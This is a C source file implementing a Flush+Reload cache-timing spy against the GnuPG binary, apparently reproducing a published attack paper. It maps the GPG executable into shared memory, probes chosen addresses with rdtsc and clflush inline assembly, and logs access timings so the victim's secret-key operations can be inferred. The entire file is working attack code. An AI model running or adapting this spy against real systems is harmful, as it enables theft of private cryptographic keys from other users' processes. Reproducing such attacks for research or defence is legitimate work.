#include <fcntl.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>

#include "args.h"

// Roughly 4 MB. Always ensure that the executable is smaller than this
#define GPG_MAX_SIZE_BYTES 4194304

// See paper for the threshold of probe()
#define PROBE_THRESHOLD 110ul

// Maximum number of addresses to probe
#define MAX_NUM_OF_ADDRS 10u

// Number of time slots to record
#define TIME_SLOTS 50000

#define busy_wait(cycles) for(volatile long i_ = 0; i_ != cycles; i_++)\
                                                 ;

int probe(char *adrs) {
    volatile unsigned long time;

    asm __volatile__(
        "    mfence             \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    lfence             \n"
        "    movl %%eax, %%esi  \n"
        "    movl (%1), %%eax   \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    subl %%esi, %%eax  \n"
        "    clflush 0(%1)      \n"
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx"
    );
    return time < PROBE_THRESHOLD;
}

unsigned long probe_timing(char *adrs) {
    volatile unsigned long time;

    asm __volatile__(
        "    mfence             \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    lfence             \n"
        "    movl %%eax, %%esi  \n"
        "    movl (%1), %%eax   \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    subl %%esi, %%eax  \n"
        "    clflush 0(%1)      \n"
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx"
    );
    return time;
}

typedef struct {
    unsigned long result[MAX_NUM_OF_ADDRS];
} time_slot;

#ifndef DYNAMIC_TIMING

void spy(char **addrs, size_t num_addrs, time_slot *slots, size_t num_slots,
        int busy_cycles) {
    for (size_t slot = 0; slot < num_slots; slot++) {
        for (int addr = 0; addr < (int) num_addrs; addr++) {
            char *ptr = addrs[addr];
            unsigned long result = probe_timing(ptr);
            slots[slot].result[addr] = result;
        }
        busy_wait(busy_cycles);
    }
}

#else

static __inline__ unsigned long long rdtsc(void)
{
    unsigned long long int x;
    __asm__ volatile (".byte 0x0f, 0x31" : "=A" (x));
    return x;
}

void spy(char **addrs, size_t num_addrs, time_slot *slots, size_t num_slots,
        int busy_cycles) {
    unsigned long long clock = rdtsc();
    unsigned long long old_clock;
    unsigned long long avg = 0;
    unsigned long long large = 0;
    unsigned long long start = clock;
    for (size_t slot = 0; slot < num_slots; slot++) {
        old_clock = clock;
        clock = rdtsc();
        while ((clock - old_clock) < (unsigned long long) busy_cycles) {
            busy_wait((busy_cycles - (clock - old_clock)) / 50);
            clock = rdtsc();
        }
        if ((clock - old_clock) > 2000 && slot > 9000 && slot < 15000) {
            large += 1;
        }
        avg = (avg * slot + (clock - old_clock)) / (slot + 1);
        if (slot % 1000 == 0) {
            printf("slot: %lu\n", slot);
        }
        for (int addr = 0; addr < (int) num_addrs; addr++) {
            char *ptr = addrs[addr];
            unsigned long result = probe_timing(ptr);
            slots[slot].result[addr] = result;
        }
    }
    printf("avg: %llu\n", avg);
    printf("avg: %llu\n", large);
    printf("elapsed: %llu\n", rdtsc() - start);
}

#endif

void write_slots_to_file(size_t num_addrs,
        time_slot *slots, size_t num_slots,
        FILE *out_file) {
    for (size_t slot = 0; slot < num_slots; slot++) {
        for (size_t addr = 0; addr < num_addrs; addr++) {
            unsigned long result = slots[slot].result[addr];
            fprintf(out_file, "%lu %lu %lu\n", slot, addr, result);
        }
    }
}

void offset_addresses(void *gpg_base, char **addrs, size_t num_addrs) {
    for (size_t i = 0; i < num_addrs; i++) {
        // Here be dragons :O
        unsigned long ptr_offset = (unsigned long)gpg_base;
        char *adjusted_ptr = addrs[i] + ptr_offset;

        addrs[i] = adjusted_ptr;
    }
}

int main(int argc, char *argv[]) {
    struct args_st arguments;
    if (!read_args(&arguments, argc, argv)) {
        return 1;
    }

    // memory map so we can force OS to share this memory page with GPG process
    size_t map_len = GPG_MAX_SIZE_BYTES;
    void *gpg_base = mmap(NULL, map_len, PROT_READ,  MAP_SHARED,
            arguments.gpg_fd, 0);
    if (gpg_base == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
    printf("GPG binary mmapped to %p\n", gpg_base);

    // NOTE: this is an array of pointers. The paper uses `char *` for this, but
    // I'm not sure yet if we can get away with using `void *` instead, which I
    // think is a lot easier to understand.
    char *addrs[MAX_NUM_OF_ADDRS];
    size_t num_addrs = read_addrs(arguments.addr_file, addrs, MAX_NUM_OF_ADDRS);
    if (num_addrs == 0) {
        fprintf(stderr, "Did not read any addresses from file\n");
        return 0;
    }

    printf("Probing %lu addresses:\n", num_addrs);
    for (size_t i = 0; i < num_addrs; i++) {
        printf("%p\n", addrs[i]);
    }

    offset_addresses(gpg_base, addrs, num_addrs);
    printf("Here are the offset addresses (respectively):\n");
    for (size_t i = 0; i < num_addrs; i++) {
        printf("%p\n", addrs[i]);
    }

    // ATTAAAAACK!
    printf("Started spying\n");
    time_slot slots[TIME_SLOTS];
    spy(addrs, num_addrs, slots, TIME_SLOTS, arguments.busy_cycles);
    printf("Finished spying\n");

    write_slots_to_file(num_addrs, slots, TIME_SLOTS, arguments.out_file);

    // Probably never reached because we'll likely just ^C the program. Maybe
    // implement a SIGTERM / SIGINT handler?
    munmap(gpg_base, map_len);
    cleanup_args(&arguments);
    return 0;
}

